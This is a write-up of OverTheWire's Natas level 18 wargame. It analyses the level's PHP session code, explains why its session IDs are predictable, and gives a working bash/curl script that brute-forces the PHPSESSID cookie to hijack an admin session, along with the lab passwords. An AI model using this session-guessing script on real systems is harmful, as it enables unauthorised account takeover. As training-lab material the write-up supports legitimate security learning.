# NATAS LEVEL 18

```
http://overthewire.org/wargames/natas/natas18.html
```

```
Username: natas18
Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
URL:      http://natas18.natas.labs.overthewire.org
```

<img src='index.jpg' width=500px>

### SOLUTION

#### CODE INSPECTION

```
<html> 
<head> 
<!-- This stuff in the header has nothing to do with the level --> 
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /> 
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script> 
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script> 
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script> 
<script>var wechallinfo = { "level": "natas18", "pass": "<censored>" };</script></head> 
<body> 
<h1>natas18</h1> 
<div id="content"> 
<? 

$maxid = 640; // 640 should be enough for everyone 

function isValidAdminLogin() { /* {{{ */ 
    if($_REQUEST["username"] == "admin") { 
    /* This method of authentication appears to be unsafe and has been disabled for now. */ 
        //return 1; 
    } 

    return 0; 
} 
/* }}} */ 
function isValidID($id) { /* {{{ */ 
    return is_numeric($id); 
} 
/* }}} */ 
function createID($user) { /* {{{ */ 
    global $maxid; 
    return rand(1, $maxid); 
} 
/* }}} */ 
function debug($msg) { /* {{{ */ 
    if(array_key_exists("debug", $_GET)) { 
        print "DEBUG: $msg<br>"; 
    } 
} 
/* }}} */ 
function my_session_start() { /* {{{ */ 
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) { 
    if(!session_start()) { 
        debug("Session start failed"); 
        return false; 
    } else { 
        debug("Session start ok"); 
        if(!array_key_exists("admin", $_SESSION)) { 
        debug("Session was old: admin flag set"); 
        $_SESSION["admin"] = 0; // backwards compatible, secure 
        } 
        return true; 
    } 
    } 

    return false; 
} 
/* }}} */ 
function print_credentials() { /* {{{ */ 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 
    print "You are an admin. The credentials for the next level are:<br>"; 
    print "<pre>Username: natas19\n"; 
    print "Password: <censored></pre>"; 
    } else { 
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19."; 
    } 
} 
/* }}} */ 

$showform = true; 
if(my_session_start()) { 
    print_credentials(); 
    $showform = false; 
} else { 
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) { 
    session_id(createID($_REQUEST["username"])); 
    session_start(); 
    $_SESSION["admin"] = isValidAdminLogin(); 
    debug("New session started"); 
    $showform = false; 
    print_credentials(); 
    } 
}  

if($showform) { 
?> 

<p> 
Please login with your admin account to retrieve credentials for natas19. 
</p> 

<form action="index.php" method="POST"> 
Username: <input name="username"><br> 
Password: <input name="password"><br> 
<input type="submit" value="Login" /> 
</form> 
<? } ?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
```

The few key parts of the code are:

1. in `print_credentials()`, this controls whether we get the password:
```
if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
```

2. in the main code body, `$_SESSION["admin"]` is set by..
```
$_SESSION["admin"] = isValidAdminLogin(); 
```

3. the `isValidAdminLogin()` used to return true if our username was `admin`,
so is useless and we don't have another way to set the `$_SESSION["admin"]
available to us.
```
function isValidAdminLogin() { /* {{{ */ 
    if($_REQUEST["username"] == "admin") { 
    /* This method of authentication appears to be unsafe and has been disabled for now. */ 
        //return 1; 
    } 

    return 0; 
} 
```

4. in `my_session_start()`, there is a check for a `PHPSESSID` in the cookie
which is interesting to us as it presents something we have control over an
may be the attack vector we need (the `isValidID()` just checks to ensure
it is an integer value)
```
if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) { 
```

5. we can also see that the `PHPSESSID` is created by a call to `createID()`
and even though it takes in the `username` as a parameter, it doesn't do 
anything with it.
```
session_id(createID($_REQUEST["username"])); 

<...>

function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
```
6. we note that the `$maxid` is 640, which is used by `createID()` to generate
the sessionID for the user.
```
$maxid = 640; // 640 should be enough for everyone
```

7. we note that `password` from the form is never used

8. there is also a `debug` flag available to us

#### TRIAL AND ERROR

Supplying `username` of `admin` and `password` of `foo`, we get a new session
started for us but our `$_SESSION["admin"] == 1` check fails so we don't get
credentials printed for us.

```
$ curl 'http://natas18.natas.labs.overthewire.org/index.php?debug' \
  -H 'Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==' \
  --data 'username=admin&password=foo'
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
DEBUG: Session start ok<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

If we try sending our own PHPSESSID cookie, it detects that the session is
"old", it sets the `admin` flag to 0 and once again our credential check fails
to produce the password for `natas19`.

```
$ curl 'http://natas18.natas.labs.overthewire.org/index.php?debug' \
  -H 'Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==' \
  -H 'Cookie: PHPSESSID=450'
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
DEBUG: Session start ok<br>DEBUG: Session was old: admin flag set<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

So how do we get `$_SESSION["admin"] == 1`?

#### ATTACK VECTOR

From the code, we see there isn't any path for us to manipulate the
`$_SESSION["admin"]` and the only thing that seems promising is that we can
control the `PHPSESSID` the code.

We see the following path:

1. we need `my_session_start()` to return true so that we avoid the path
that sets `$_SESSION["admin"]` to `isValidAdminLogin()` which wil be 0.
2. to get `my_session_start()` to return true, we need to supply a `PHPSESSID`
in our cookie of a session which is already exists and we can resume with the
call to `session_start()`.
3. if we resume a `PHPSESSID` session which already has `$_SESSION["admin"]`
set, it won't got down the "Session was old" path and set the flag to false.
4. through this path we can get to `print_credentials()` with "admin" set to
true and get the password
5. since the range of `PHPSESSID` is only between 0-640 in this program, it
seems reasonable to brute force iterate through the space and see if we do
indeed find a session which already has "admin=1" set for us

#### BRUTE FORCE

Wrote a script to inject each value of SESSIONID from 1 - 640 until we found
one that allows us to go down the "admin=true" path..

```
$ cat script.sh
#! /bin/bash

for SESSIONID in {0..640}
do
  echo "${SESSIONID}"
  #--data 'username=admin&password=foo'
  curl --silent \
    'http://natas18.natas.labs.overthewire.org/index.php?debug' \
    -H 'Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==' \
    -H "Cookie: PHPSESSID=${SESSIONID}" \
    | grep "Password"

  if [ $? -eq 0 ]; then
    # if the string "Password:" to indicate we've received the credentials
    # for natas19 from "print_credentials()"
    break;
  fi
done
```

```
$ ./script.sh
0
1
2
3
4
5

<...>

115
116
117
118
119
Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

Looks like `PHPSESSID=119` worked! Let's try individually just to try..

```
$ curl --silent 'http://natas18.natas.labs.overthewire.org/index.php?debug' -H 'Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==' -H "Cookie: PHPSESSID=119"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas19
Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
